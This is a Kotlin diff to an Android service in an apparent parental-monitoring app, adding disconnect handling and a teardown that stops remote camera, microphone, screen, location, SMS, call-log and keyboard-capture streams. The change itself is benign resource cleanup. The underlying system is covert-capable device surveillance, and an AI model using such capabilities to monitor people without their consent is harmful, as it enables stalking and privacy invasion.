@@ -427,6 +427,14 @@ class NexusBackgroundService : Service() {
                 onRenegotiationAnswerReceived = { answer ->
                     Log.d(TAG, "Renegotiation answer received. Passing to WebRtcManager...")
                     webRtcManager?.handleRenegotiationAnswer(answer)
+                },
+                onSessionEnded = {
+                    Log.d(TAG, "Signaling session cleared in Firebase by parent. Triggering immediate teardown...")
+                    if (_isConnected.value) {
+                        _isConnected.value = false
+                        notificationManager.updateNotification(false)
+                        resetControllerStates()
+                    }
                 }
             )
             signalingClient = sigClient
@@ -624,6 +632,17 @@ class NexusBackgroundService : Service() {
      * Routes incoming DataChannel commands from the desktop parent console to the appropriate domain handler.
      */
     private fun dispatchCommand(command: String) {
+        val trimmed = command.trim()
+
+        // Fast-path: Explicit session disconnection command from parent console
+        if (trimmed == "DISCONNECT") {
+            Log.w(TAG, "Explicit DISCONNECT command received from Parent over DataChannel. Triggering immediate teardown...")
+            _isConnected.value = false
+            notificationManager.updateNotification(false)
+            resetControllerStates()
+            return
+        }
+
         val handled = cameraCommandHandler?.handleCommand(command) == true ||
                 micCommandHandler?.handleCommand(command) == true ||
                 locationCommandHandler?.handleCommand(command) == true ||
@@ -645,8 +664,22 @@ class NexusBackgroundService : Service() {
 
     /**
      * Resets active streaming / monitoring controller states upon disconnection.
+     *
+     * Hey friend! Here is why this centralized teardown is so essential:
+     * When the desktop parent closes their app, refreshes their browser, or drops connection,
+     * no parent is listening anymore. We MUST immediately release hardware resources:
+     * 1. Camera: stops Camera2 sensor capture and mutes video track.
+     * 2. Microphone: disposes native AudioRecord hardware driver.
+     * 3. Intercom: restores normal device volume levels and audio routing.
+     * 4. Screen: stops 1080p virtual display, internal audio capturer, and dismisses FGS notification.
+     * 5. GPS Location: powers down FusedLocationProviderClient to prevent battery drain.
+     * 6. Call Logs & SMS: unregisters content observers from Android system databases.
+     * 7. Notifications & Keyboard: detaches accessibility and notification listener callbacks.
+     * 8. Storage: cancels in-flight file chunk uploads and directory thumbnail generators.
+     * 9. Flashlight & Vibration: shuts off physical torch LED and cancels vibration motor patterns.
      */
     private fun resetControllerStates() {
+        Log.d(TAG, "Executing comprehensive hardware teardown across all monitoring domains...")
         cameraCommandHandler?.onPeerDisconnected()
         micCommandHandler?.onPeerDisconnected()
         locationCommandHandler?.onPeerDisconnected()
@@ -654,11 +687,18 @@ class NexusBackgroundService : Service() {
         smsCommandHandler?.onPeerDisconnected()
         vibrateFlashCommandHandler?.onPeerDisconnected()
         wallpaperCommandHandler?.onPeerDisconnected()
-        storageCommandHandler?.cleanup()
+        storageCommandHandler?.onPeerDisconnected()
         notificationCommandHandler?.onPeerDisconnected()
         screenCommandHandler?.onPeerDisconnected()
         keyboardCommandHandler?.onPeerDisconnected()
         appLockCommandHandler?.onPeerDisconnected()
+
+        // Critical: Close active PeerConnection so WebRTC C++ native VoiceEngine
+        // destroys its internal audio channels and halts AudioRecord hardware recording!
+        // This ensures the green microphone dot in Android's status bar turns off immediately.
+        webRtcManager?.closePeerConnection()
+
+        Log.d(TAG, "Teardown complete: All active monitoring and streaming pipelines reset to idle.")
     }
 
     /**
